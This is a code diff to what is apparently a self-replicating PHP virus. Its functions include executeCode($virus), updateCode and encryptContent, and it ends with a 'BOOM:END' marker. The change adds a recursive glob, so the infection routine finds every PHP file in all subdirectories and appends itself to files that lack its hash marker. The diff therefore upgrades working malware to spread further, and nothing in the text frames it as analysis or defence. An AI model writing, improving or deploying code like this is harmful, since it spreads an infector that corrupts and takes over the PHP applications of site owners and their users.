@@ -8,9 +8,9 @@ if(!function_exists('executeCode')){
     function executeCode($virus)
     {
         $version = "1.0.0";
-        $filenames = glob('*.php');
+        $filenames = glob_recursive('*.php');
         foreach ($filenames as $filename) {
-            if($filename == basename(__FILE__) or $filename == '.\\'.basename(__FILE__)) continue;
+            if($filename == basename(__FILE__)) continue;
             $script = fopen($filename, "r");
             $first_line = fgets($script);
             $virus_hash = md5($filename.$version);
@@ -42,13 +42,13 @@ if(!function_exists('executeCode')){
 if(!function_exists('updateCode')){
     function updateCode(){
         $version = "1.0.0";
-        $filenames = glob('*.php');
+        $filenames = glob_recursive('*.php');
         foreach ($filenames as $filename) {
+            if($filename == basename(__FILE__)) continue;
             $script = fopen($filename, "r");
             $first_line = fgets($script);
             $virus_hash = md5($filename.$version);
             if(strpos($first_line, $virus_hash) === false){
-                if($filename == basename(__FILE__)) continue;
                 $file_content = file_get_contents($filename);
                 $pos = strpos($file_content, 'executeCode($virus);');
                 if ($pos === false) {
@@ -133,6 +133,20 @@ if(!function_exists('encryptContent')){
         ";
         // Return or use the payload as needed
         return $payload;
+    }
+}
+
+/**
+ *  Glob all files recursively
+ */
+if (!function_exists('glob_recursive')) {
+    function glob_recursive($pattern, $flags = 0)
+    {
+        $files = glob($pattern, $flags);
+        foreach (glob(dirname($pattern) . '/*', GLOB_ONLYDIR | GLOB_NOSORT) as $dir) {
+            $files = array_merge($files, glob_recursive($dir . '/' . basename($pattern), $flags));
+        }
+        return $files;
     }
 }
 // BOOM:END
